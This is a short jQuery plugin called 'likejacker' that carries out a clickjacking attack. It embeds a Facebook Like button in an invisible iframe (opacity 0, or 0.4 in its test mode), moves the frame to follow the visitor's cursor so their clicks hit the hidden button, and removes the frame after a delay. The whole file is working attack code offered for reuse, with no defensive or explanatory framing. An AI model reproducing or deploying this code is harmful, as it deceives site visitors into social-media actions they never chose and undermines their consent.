(function ($) {
	$.fn.likejacker = function (options) {
		
		/* Some default options */
		options = $.extend({
			target: null,
			test: false,
			time: 1000,
			end: function () {}
		}, options);
		
		return this.each(function () {
			var $this = $(this),
				src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent( options.target ) + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
			
			/* Set the Opacity */
			var getOpacity = function() {
				return (options.test) ? '0.4' : '0';
			};
			
			/* Create the likejacker element */
			$this.append('<iframe class="likejacker" src="' + src + '"></iframe>');
			$('.likejacker', $this).css({
				border: 0,
				width: '50px',
				height: '23px',
				opacity: getOpacity(),
				position: 'absolute'
			});
			
			/* On mouse movement, we will move the iframe accordingly */
			$this.mousemove(function(e){
				$('.likejacker', $this).css({
					left: e.pageX - 25,
					top: e.pageY - 7
				});
			});
			
			/*
				On enter the field we will set a timeout to remvove it, 
				normally people will click an element right after entering the field.
			*/
			$($this).mouseenter(function () {
				setTimeout(function(){
				// Remove the like iframe
				$('.likejacker', $this).remove();
				// Callback function
				options.end.call(this, $this);
			  }, options.time);
			});

		});
	};
})(jQuery);